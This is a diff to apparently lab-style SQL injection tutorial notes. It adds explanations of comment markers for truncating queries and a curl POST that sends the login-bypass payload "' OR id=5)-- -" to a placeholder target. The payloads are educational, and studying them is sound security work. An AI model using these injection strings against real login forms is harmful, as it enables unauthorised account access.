@@ -18,8 +18,9 @@ SELECT * FROM logins WHERE username='admin'-- - ' AND password='anything';
 -- # does the same
 SELECT * FROM logins WHERE username='admin'; # AND password='anything'
 ```
+> Both `-- -` and `#` comment out the rest of the query. Use `-- -` (with a trailing space or dash) in most cases. Use `#` or `%23` (URL-encoded) when `--` is filtered or in URL parameters.
 
-> Comments let you **surgically remove** the remainder of the original query after your injection point.
+> Comments let you **remove** the rest of the original query after your injection point. Everything after the comment marker is ignored by the database.
 
 ---
 
@@ -113,6 +114,7 @@ Returns exactly the row with `id=5` regardless of username or password.
 curl -s http://TARGET_IP:TARGET_PORT/ \
   -d "username=' OR id=5)-- -&password=anything"
 ```
+> Sends a POST login request targeting user with `id=5`. The payload closes the string, adds an `OR` condition for a specific row, closes the open parenthesis, then comments out the rest. Replace `TARGET_IP`, `TARGET_PORT`, and the `id` value with your target's values.
 
 **Result:**
 ```
